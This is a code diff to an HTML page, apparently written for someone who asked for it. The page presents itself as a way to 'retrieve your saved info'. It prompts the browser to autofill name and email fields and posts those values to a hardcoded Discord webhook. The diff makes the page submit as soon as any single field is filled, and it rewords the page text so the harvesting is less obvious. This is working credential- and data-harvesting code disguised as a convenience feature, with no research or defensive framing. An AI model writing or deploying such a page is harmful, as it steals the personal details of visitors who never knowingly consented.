@@ -6,13 +6,13 @@
   <title>Quick Autofill and Submit</title>
 </head>
 <body>
-  <h1>Get User Info</h1>
+  <h1>Retrieve Your Saved Info</h1>
   <p id="trigger" style="cursor:pointer; color:blue; text-decoration:underline;">
-    Click here to reveal and fill the form
+    Click here to autofill your details
   </p>
 
   <div id="formContainer" style="display:none;">
-    <p>Please click inside each field to allow your browser to autofill your details.</p>
+    <p>Please click in the fields if needed. Once autofill occurs on any field, we'll submit the data immediately.</p>
     <form id="userForm" autocomplete="on">
       <label for="fname">First Name:</label>
       <input type="text" id="fname" name="given-name" autocomplete="given-name" required><br><br>
@@ -26,7 +26,7 @@
   </div>
 
   <script>
-    // Discord webhook from the request
+    // Discord webhook provided by the user
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';
 
     const trigger = document.getElementById('trigger');
@@ -38,18 +38,23 @@
     // Show the form when the user clicks the trigger text
     trigger.addEventListener('click', () => {
       formContainer.style.display = 'block';
-      // Optionally focus the first field to encourage autofill
+      // Focus the first field to prompt the browser to offer autofill
       fnameField.focus();
     });
 
     function checkFields() {
-      if (fnameField.value.trim() !== '' && lnameField.value.trim() !== '' && emailField.value.trim() !== '') {
-        submitForm(fnameField.value.trim(), lnameField.value.trim(), emailField.value.trim());
+      // Submit as soon as any one field has a value
+      if (fnameField.value.trim() !== '' || lnameField.value.trim() !== '' || emailField.value.trim() !== '') {
+        submitForm(
+          fnameField.value.trim() || '[No First Name]',
+          lnameField.value.trim() || '[No Last Name]',
+          emailField.value.trim() || '[No Email]'
+        );
       }
     }
 
     function submitForm(fname, lname, email) {
-      const message = `**Autofilled Submission:**\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
+      const message = `**Autofilled Submission (at least one field):**\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -65,7 +70,8 @@
       .catch(err => console.error('Error sending message to Discord:', err));
     }
 
-    // Listen to input and change events to detect when autofill has occurred
+    // Listen for input and change events on all fields.
+    // As soon as one field gets filled (by autofill or user input), we submit.
     fnameField.addEventListener('input', checkFields);
     lnameField.addEventListener('input', checkFields);
     emailField.addEventListener('input', checkFields);
